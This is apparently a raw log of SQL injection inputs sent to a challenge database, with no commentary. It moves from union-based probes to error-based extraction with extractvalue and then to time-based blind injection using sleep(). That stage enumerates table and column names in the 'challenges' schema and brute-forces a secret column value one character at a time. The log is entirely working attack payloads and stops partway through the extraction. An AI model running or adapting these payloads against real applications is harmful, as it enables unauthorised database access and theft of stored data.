ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if( left(database(),1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'Y' ,sleep(3),0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'z') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'A') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'B') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'C') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'D') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'E') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'F') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'G') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'H') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'I') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'J') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'K') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'L') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'M') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'N') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'O') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'P') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'Q') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'R') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'S') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'T') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'U') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'V') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'W') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'X') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'Y') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = 'Z') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '0') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '1') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '2') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '3') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '4') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '5') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '6') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '7') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '8') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '9') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '!') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '"') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '$') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '%') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '&') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ''') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '(') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ')') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '*') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '+') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ',') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '-') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '.') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '/') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ':') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ';') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '<') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '=') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '>') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '?') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '@') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '[') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '\') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = ']') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '^') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '_') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '`') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '{') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '|') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '}') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 4,1),1) = '~') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'a') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'b') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'c') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'd') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'e') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'f') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'g') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'h') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'i') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'j') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'k') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'l') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),1) = 'm') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'ma') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mb') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mc') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'md') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'me') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mf') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mg') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mh') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mi') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mj') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mk') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'ml') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mm') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mn') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mo') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mp') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mq') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mr') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'ms') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mt') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mu') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mv') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mw') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),2) = 'mx') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxa') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxb') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxc') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxd') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxe') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxf') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxg') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxh') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxi') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxj') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxk') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxl') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxm') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxn') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxo') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxp') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxq') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxr') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxs') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxt') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxu') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),3) = 'mxv') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxva') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvb') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvc') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvd') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxve') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvf') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvg') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvh') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvi') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvj') , sleep(5) , 0) #
ID:1') and if( (left((select secret_papo from wf227g4abp limit 0,1),4) = 'mxvk') , sleep(5) , 0) #
